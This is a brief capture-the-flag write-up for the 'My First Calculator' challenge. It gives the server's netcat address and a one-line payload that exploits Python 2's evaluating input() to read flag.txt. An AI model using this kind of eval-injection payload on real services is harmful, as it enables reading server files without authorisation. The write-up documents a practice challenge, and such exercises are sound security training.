# My First Calculator

I'm really new to python. Please don't break my calculator!
nc misc.hsctf.com 7001
There is a flag.txt on the server.

## Solution

Use this payload to bypass input() function in python 2 and get the flag:

```
{eval(open('flag.txt','r').read())}
```